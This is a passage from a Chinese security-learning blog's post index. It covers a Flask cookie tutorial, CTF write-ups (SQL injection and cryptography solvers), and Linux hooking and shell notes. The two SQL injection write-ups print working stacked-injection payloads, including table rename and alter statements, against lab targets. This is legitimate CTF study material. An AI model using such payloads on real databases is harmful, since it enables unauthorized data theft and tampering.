class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response, request</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route("/set_cookie")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_cookie</span><span class="params">()</span>:</span></span><br><span class="line">    resp = make_response(<span class="string">"success"</span>)</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">        设置cookie,默认有效期是临时cookie,浏览器关闭就失效</span></span><br><span class="line"><span class="string">        可以通过 max_age 设置有效期， 单位是秒</span></span><br><span class="line"><span class="string">    '''</span><span class="string">''</span></span><br><span class="line">    resp.set_cookie(<span class="string">"Itcast_1"</span>, <span class="string">"python_1"</span>)</span><br><span class="line">    resp.set_cookie(<span class="string">"Itcast_2"</span>, <span class="string">"python_2"</span>)</span><br><span class="line">    resp.set_cookie(<span class="string">"Itcast_3"</span>, <span class="string">"python_3"</span>, max_age=<span class="number">3600</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route("/get_cookie")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_cookie</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">        获取cookie，通过reques.cookies的方式，</span></span><br><span class="line"><span class="string">        返回的是一个字典，可以用get的方式</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    cookie_1 = request.cookies.get(<span class="string">"Itcast_1"</span>)  <span class="comment"># 获取名字为Itcast_1对应cookie的值</span></span><br><span class="line">    <span class="keyword">return</span> cookie_1</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route("/delete_cookie")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_cookie</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">        删除cookie，通过delete_cookie()的方式，</span></span><br><span class="line"><span class="string">        里面是cookie的名字</span></span><br><span class="line"><span class="string">        这里的删除只是让cookie过期，并不是直接删除cookie</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    resp = make_response(<span class="string">"del success"</span>)</span><br><span class="line">    resp.delete_cookie(<span class="string">"Itcast1"</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>参考教程:</p><ol><li><a href="https://www.w3cschool.cn/flask/" target="_blank" rel="noopener">https://www.w3cschool.cn/flask/</a> </li></ol><p>参考文章: </p><ol><li><a href="https://www.cnblogs.com/djflask/p/10460177.html" target="_blank" rel="noopener">https://www.cnblogs.com/djflask/p/10460177.html</a> </li><li><a href="https://blog.csdn.net/wei18791957243/article/details/85172653" target="_blank" rel="noopener">https://blog.csdn.net/wei18791957243/article/details/85172653</a> </li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF-EasySQL</title>
      <link href="/2020/04/27/SUCTF-EasySQL/"/>
      <url>/2020/04/27/SUCTF-EasySQL/</url>
      
        <content type="html"><![CDATA[<p>堆叠注入</p><p>分析后端语句 </p><p>由于输入1有回显，0无回显，所以可能存在||的操作，也就是select 输入的数据||内置的一个列名 from 表名，进一步进行猜测即为select post进去的数据||flag from Flag(含有数据的表名，通过堆叠注入可知，需要注意的是，此时的||起到的作用是or的作用。 </p><p>解法1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,1</span><br></pre></td></tr></table></figure><p>此时sql语句变为<code>$select *,1||flag from Flag</code></p><p>解法2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;set sql_mode&#x3D;pipes_as_concat;select 1</span><br></pre></td></tr></table></figure><p>其中set sql_mode=pipes_as_concat;的作用为将||的作用由or变为拼接字符串 ，因此能将前一个字段的查询结果和后一个字段查询结果进行拼接 </p><p><img src="/2020/04/27/SUCTF-EasySQL/SUCTF-easysql.png" alt="运行截图"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安恒4月赛-从not_RSA了解Paillier加密算法</title>
      <link href="/2020/04/27/%E5%AE%89%E6%81%924%E6%9C%88%E8%B5%9B-%E4%BB%8Enot_RSA%E4%BA%86%E8%A7%A3Paillier%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"/>
      <url>/2020/04/27/%E5%AE%89%E6%81%924%E6%9C%88%E8%B5%9B-%E4%BB%8Enot_RSA%E4%BA%86%E8%A7%A3Paillier%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>首先了解一下<a href="https://blog.csdn.net/qq_26816591/article/details/82944696" target="_blank" rel="noopener">Paillier加密算法</a>，也是同态加密算法的一种</p><ol><li>选取大素数p，q （p，q相近）</li><li>n=p*q，λ = (p-1)*(q-1)</li><li>随机数g</li><li>PK=(n, g) , SK=λ</li></ol><p>加密：$C = g^{m} * r^{n}\mod n^{2}$, 其中r为随机数(1,n)</p><p>解密：$m=L(C^{λ}\mod n^{2})/L(g^{λ}\mod n^{2})\mod n$，其中L(x) = (x-1)/n</p><p>原题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime <span class="keyword">as</span> getprime ,long_to_bytes,bytes_to_long,inverse</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,p,q</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> isprime,nextprime</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">n=p*q</span><br><span class="line">g=n+<span class="number">1</span></span><br><span class="line">r=random.randint(<span class="number">1</span>,n)</span><br><span class="line"></span><br><span class="line">c=(pow(g,m,n*n)*pow(r,n,n*n))%(n*n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"c=%d"</span>%(c)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"n=%d"</span>%(n)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">c=29088911054711509252215615231015162998042579425917914434962376243477176757448053722602422672251758332052330100944900171067962180230120924963561223495629695702541446456981441239486190458125750543542379899722558637306740763104274377031599875275807723323394379557227060332005571272240560453811389162371812183549</span></span><br><span class="line"><span class="string">n=6401013954612445818165507289870580041358569258817613282142852881965884799988941535910939664068503367303343695466899335792545332690862283029809823423608093</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>解法：利用yafu分解n得到p，q</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强网杯-随便注</title>
      <link href="/2020/04/25/%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/"/>
      <url>/2020/04/25/%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<p>首先判断一下有无注入：输入1’发现不回显，然后1’ #显示正常，应该是存在sql注入了 </p><p>过滤了<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p><p>尝试堆叠注入 <code>?inject=1&#39;;show databases;%23</code></p><p>查看所有的表 <code>?inject=1&#39;;show tables;%23</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject&#x3D;1&#39;;show columns from &#96;1919810931114514&#96;;%23</span><br></pre></td></tr></table></figure><p>发现flag在这张表中</p><p>既然没过滤 alert 和 rename，那就可以把表和列改名。先把 words 改为 words1，再把数字表改为 words，然后把新的 words 表里的 flag 列改为 id ，这样就可以直接查询 flag 了 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?inject&#x3D;1&#39;;RENAME TABLE &#96;words&#96; TO &#96;words1&#96;;RENAME TABLE &#96;1919810931114514&#96; TO &#96;words&#96;;ALTER TABLE &#96;words&#96; CHANGE &#96;flag&#96; &#96;id&#96; VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;%23</span><br></pre></td></tr></table></figure><p>最后<code>/?inject=1&#39; or &#39;1&#39;=&#39;1</code>获取flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020数字中国虎符CTF之GM&amp;McEliece</title>
      <link href="/2020/04/20/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6CTF%E4%B9%8BGM&amp;McEliece/"/>
      <url>/2020/04/20/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6CTF%E4%B9%8BGM&amp;McEliece/</url>
      
        <content type="html"><![CDATA[<h3 id="GM"><a href="#GM" class="headerlink" title="GM"></a>GM</h3><p>根据<code>pow(q ** 2 * x, (p-1)/2, p) + pow(p ** 2 * x, (q-1)/2, q) == N - phi - 1</code>可以得出<code>pow(x, (p-1)/2, p) == -1</code>。同时<code>(pow(x, int(br + bi, 2), N) * r ** 2) % N</code>等价于$x^{br\ast2+bi}\ast r^2\mod N$, 将其记为$a$，然后我们尝试计算一下$a^{(p-1)/2}\mod p$。我们把$a$代入化简，得到$x^{br\ast2\ast(p-1)/2}\ast x^{bi\ast(p-1)/2}\ast r^{2\ast(p-1)/2}\mod p$，由于第一项和第三项的结果一定为1，因此，当$bi=1$时，整个式子的结果为-1，$bi=0$时整个式子的结果为1。据此，我们可以判断某一位是0还是1。</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author: zraxx</span></span><br><span class="line"><span class="comment">#date: 2020-4-19</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"output"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">f = f.readlines()</span><br><span class="line"></span><br><span class="line">phin = int(f[<span class="number">0</span>].strip())</span><br><span class="line">n = int(f[<span class="number">1</span>].strip())</span><br><span class="line">enc = eval(f[<span class="number">2</span>].strip())</span><br><span class="line"></span><br><span class="line">a = n-phin+<span class="number">1</span></span><br><span class="line"><span class="comment"># print iroot(a**2-4*n, 2)</span></span><br><span class="line">p = (a+iroot(a**<span class="number">2</span><span class="number">-4</span>*n, <span class="number">2</span>)[<span class="number">0</span>])//<span class="number">2</span></span><br><span class="line"><span class="keyword">assert</span> n%p==<span class="number">0</span></span><br><span class="line"></span><br><span class="line">res = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> enc:</span><br><span class="line"><span class="keyword">if</span> pow(x, (p<span class="number">-1</span>)//<span class="number">2</span>, p) == <span class="number">1</span>:</span><br><span class="line">res = res + <span class="string">'0'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">res = res + <span class="string">'1'</span></span><br><span class="line"></span><br><span class="line">print(long_to_bytes(int(res,<span class="number">2</span>)))</span><br></pre></td></tr></table></figure><p><strong>FLAG: flag{bd4f1790-f4a2-4904-b4d2-8db8b24fd864}</strong></p><h3 id="McEliece"><a href="#McEliece" class="headerlink" title="McEliece"></a>McEliece</h3><p>根据pubkey可以得出，加密时plain长为28bit，结果为64bit，错误码中6位为1。由于flag中的字符类型有限，可以直接爆破，计算的结果$uG’$和题目给出的加密的结果$uG’+e$应该满足海明距离小于等于6。</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author: zraxx</span></span><br><span class="line"><span class="comment">#date: 2020-4-19</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line">pubkey=load(<span class="string">"./pubkey.sobj"</span>)</span><br><span class="line">cipher=load(<span class="string">"./cipher.sobj"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(plain)</span>:</span></span><br><span class="line"><span class="keyword">return</span> plain*pubkey</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">same</span><span class="params">(a, b)</span>:</span></span><br><span class="line">sum = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(a.ncols()):</span><br><span class="line"><span class="keyword">if</span> a[<span class="number">0</span>,i] == b[<span class="number">0</span>,i]:</span><br><span class="line">sum += <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> sum</span><br><span class="line"></span><br><span class="line">l = <span class="number">28</span></span><br><span class="line">t = <span class="string">"0123456789abcdef-&#125;"</span></span><br><span class="line">len = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">"flag&#123;c9"</span></span><br><span class="line">prev_cand=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> len&lt;<span class="number">12</span>:</span><br><span class="line"><span class="keyword">print</span> len</span><br><span class="line">cand = <span class="string">""</span></span><br><span class="line">iter = product(t, repeat=<span class="number">4</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> iter:</span><br><span class="line">tmp = flag+<span class="string">""</span>.join(x)</span><br><span class="line">bin = BinaryStrings()</span><br><span class="line">msg = map(int ,str(bin.encoding(tmp)))</span><br><span class="line">plain = matrix(GF(<span class="number">2</span>),<span class="number">1</span>,l)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(l):</span><br><span class="line">plain[<span class="number">0</span>,j] = msg[l*len+j]</span><br><span class="line"><span class="keyword">if</span> same(cipher[len], encrypt(plain))&gt;=(<span class="number">64</span><span class="number">-6</span>):</span><br><span class="line"><span class="keyword">if</span> len%<span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">prev_cand.append(x[<span class="number">3</span>])</span><br><span class="line">cand = x</span><br><span class="line"><span class="keyword">print</span> <span class="string">""</span>.join(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span> x[<span class="number">0</span>] <span class="keyword">in</span> prev_cand:</span><br><span class="line">flag += <span class="string">""</span>.join(x)</span><br><span class="line">prev_cand = []</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> len%<span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">flag+=<span class="string">""</span>.join(cand[:<span class="number">3</span>])</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line">len += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;c941a3cc-85e3-4401-a0f1-764206e71bf3&#125;</span></span><br></pre></td></tr></table></figure><p><strong>FLAG: flag{c941a3cc-85e3-4401-a0f1-764206e71bf3}</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Hook技术介绍</title>
      <link href="/2020/04/18/Linux-Hook%E6%8A%80%E6%9C%AF%E4%BB%8B%E7%BB%8D/"/>
      <url>/2020/04/18/Linux-Hook%E6%8A%80%E6%9C%AF%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<p>Linux常见的hook技术主要有四种，分别为内核模块hook，应用层inline hook，应用层Got hook以及应用层preload hook。下面具体介绍一下</p><h3 id="内核模块hook"><a href="#内核模块hook" class="headerlink" title="内核模块hook"></a>内核模块hook</h3><blockquote><p>通常是从内核源码特殊位置，修改回调、修改中断表；或修改重编译内核，导出内部函数，从而跳转到自定义函数，开发内核模块实现hook。 </p><p>其特性如下：</p><ul><li>可以拦截到所有应用层系统调用，应用层无法绕过</li><li>开发调试复杂，测试周期长，升级和卸载内核模块带来稳定性问题</li></ul></blockquote><h3 id="应用层inline-Hook"><a href="#应用层inline-Hook" class="headerlink" title="应用层inline Hook"></a>应用层inline Hook</h3><blockquote><p>应用层内联hook，即直接修改二进制函数体的汇编指令，修改执行逻辑使其跳转到自定义函数，开发应用层模块实现hook。 </p><p>其特性如下：</p><ul><li>可以拦截到系统调用和普通库函数</li><li>由于linux系统本身具有多个发行版本及指令集，不容易做到通用</li><li>可以通过自定义实现底层函数或恢复模块内存方式绕过</li></ul></blockquote><h3 id="应用层Got-Hook"><a href="#应用层Got-Hook" class="headerlink" title="应用层Got Hook"></a>应用层Got Hook</h3><blockquote><p>应用层got表hook，即在运行阶段修改程序本身got表，这样调用api的逻辑，就会相应的跳转到用户自定义函数中。</p><ul><li>可以拦截系统调用和普通库函数</li><li>由于只需要考虑ELF格式因此实现难度较为简单</li><li>可以通过自定义实现底层函数或恢复got表内存方式绕过</li></ul></blockquote><h3 id="Preload-Hook"><a href="#Preload-Hook" class="headerlink" title="Preload Hook"></a>Preload Hook</h3><blockquote><p>  Preload Hook是指利用系统支持的preload能力，将模块自动注入进程实现hook。可以通过以下手段使用Preload技术：一种是环境变量配置(LD_PRELOAD)；另一种是文件配置：(/etc/ld.so.preload)。</p><ul><li>若使用命令行指定LD_PRELOAD则只影响该新进程及子进程；若写入全局环境变量则LD_PRELOAD对所有新进程生效；父进程可以控制子进程的环境变量从而取消preload</li><li>文件preload方式影响所有新进程且无法被取消</li><li>可以拦截到系统调用和普通库函数</li><li>实现和操作最为简单，只需要编写同名系统调用函数即可实现hook</li><li>可以使用动态调用方式或自定义实现方式绕过</li></ul></blockquote><h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><p><a href="https://www.jianshu.com/p/69e6089a7291" target="_blank" rel="noopener">https://www.jianshu.com/p/69e6089a7291</a></p><p><a href="https://www.jianshu.com/p/f78b16bd8905" target="_blank" rel="noopener">https://www.jianshu.com/p/f78b16bd8905</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux终端控制打印字符的颜色</title>
      <link href="/2020/04/17/Linux%E7%BB%88%E7%AB%AF%E6%8E%A7%E5%88%B6%E6%89%93%E5%8D%B0%E5%AD%97%E7%AC%A6%E7%9A%84%E9%A2%9C%E8%89%B2/"/>
      <url>/2020/04/17/Linux%E7%BB%88%E7%AB%AF%E6%8E%A7%E5%88%B6%E6%89%93%E5%8D%B0%E5%AD%97%E7%AC%A6%E7%9A%84%E9%A2%9C%E8%89%B2/</url>
      
        <content type="html"><![CDATA[<p>格式：\033[控制码;背景颜色;前景颜色m字符串\033[0m </p><p><em>注意：\033可以替换为\x1b，同指 Esc ，各个属性的范围不同，因此不会混淆</em></p><p><strong>前景色：</strong>30-37</p><p><strong>背景色：</strong>40-47</p><p><strong>控制码：</strong></p><blockquote><p>\33[0m 关闭所有属性<br>\33[1m 设置高亮度<br>\33[4m 下划线<br>\33[5m 闪烁<br>\33[7m 反显<br>\33[8m 消隐<br>\33[30m — \33[37m 设置前景色<br>\33[40m — \33[47m 设置背景色<br>\33[nA 光标上移n行<br>\33[nB 光标下移n行<br>\33[nC 光标右移n行<br>\33[nD 光标左移n行<br>\33[y;xH设置光标位置<br>\33[2J 清屏<br>\33[K 清除从光标到行尾的内容<br>\33[s 保存光标位置<br>\33[u 恢复光标位置<br>\33[?25l 隐藏光标<br>\33[?25h 显示光标</p></blockquote><p><strong>以下为常用的三种类型</strong></p><p>\x1b[1;31m字符串\x1b[0m    <font color="red"> 高亮红色字体（error）</font></p><p>\x1b[1;33m字符串\x1b[0m    <font color="yellow"> 高亮黄色字体（info）</font></p><p>\x1b[1;34m字符串\x1b[0m    <font color="blue"> 高亮蓝色字体（debug）</font></p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VolgaCTF-2020-Keygreed-WP</title>
      <link href="/2020/04/17/VolgaCTF-Keygreed/"/>
      <url>/2020/04/17/VolgaCTF-Keygreed/</url>
      
        <content type="html"><![CDATA[<p>关于mov attack，可以参考这篇<a href="https://blog.csdn.net/qq_26060285/article/details/90482755" target="_blank" rel="noopener">博客</a></p><p>下面简单说说这道题</p><p>首先我们可以验证这个椭圆曲线是超奇异的(supersingular)，在这里 $p^2 - 1 = 0\mod p.order()$</p><blockquote><p>The MOV attack works by using the <a href="https://en.wikipedia.org/wiki/Weil_pairing" target="_blank" rel="noopener">Weil pairing</a> (e: $E[m]×E[m]→μ_m$) to translate solving the dlog in the elliptic curve group to solving it in the multiplicative group $μ_m$ (group of m-th roots of unity), where sub-exponential algorithms exist. </p><p>Then, working in $F_{p^k}$ (extension of $F_p$), take Q to be a point in $E[m]$ (group of m-torsion points), such that P,Q are linearly independent, which can be constructed. Finally, take $e(P,Q)$ and $e(xP,Q)=e(P,Q)^x$ (due to bilinearity of e) as a dlog instance over a fininte field (m-th roots of unity), this is true by the non-degeneracy of the Weil pairing.</p></blockquote><p>因此这里的关键就是找到点Q，然后便把问题转化为了一个离散对数问题，寻找点Q的步骤如下</p><ol><li>在$F_{p^k}$上随机选取一个点，记为$R$</li><li>计算$m=R.order()$</li><li>计算$d=gcd(m,P.order)$</li><li>得到$Q=(m//d)*R$</li></ol><p>得到$Q$后，由于$Q=k*P$，因此问题就变得简单了很多。</p><p>好了，到了这里，事实上我还是没有搞懂MOV attack的具体原理，也没有讲清楚这道题的具体解法。不过没关系，后续可以慢慢理解，而且我认为我已经把MOV attack中的最重要的一个环节简单的阐述了一下。</p><p>Anyway，如果想看看这道题的具体解法，可以参考这篇<a href="https://sectt.github.io/writeups/Volga20/crypto_keygreed/README" target="_blank" rel="noopener">WriteUp</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 密码学 </tag>
            
            <tag> ECC </tag>
            
            <tag> MOV attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux下批量kill多个同名进程</title>
      <link href="/2020/04/16/Linux%E4%B8%8B%E6%89%B9%E9%87%8Fkill%E5%A4%9A%E4%B8%AA%E5%90%8C%E5%90%8D%E8%BF%9B%E7%A8%8B/"/>
      <url>/2020/04/16/Linux%E4%B8%8B%E6%89%B9%E9%87%8Fkill%E5%A4%9A%E4%B8%AA%E5%90%8C%E5%90%8D%E8%BF%9B%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<blockquote><p>循序渐进</p><p>第一步：ps -ef | grep [name] 筛选出同名的所有进程</p><p>第二步：ps -ef | grep [name] | grep -v grep 将第一步中的grep进程删除</p><p>第三步：ps -ef | grep [name] | grep -v grep | cut -c 1-5 截断获取所有的pid号，这里cut的作用就是截取，1-5的作用是根据下标取出pid号，类似于python的切片，需要根据实际情况来调整</p><p>第四步：ps -ef | grep [name] | grep -v grep | cut -c 1-5 | xargs kill -9 将之前的所有pid作为kill命令的参数 </p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
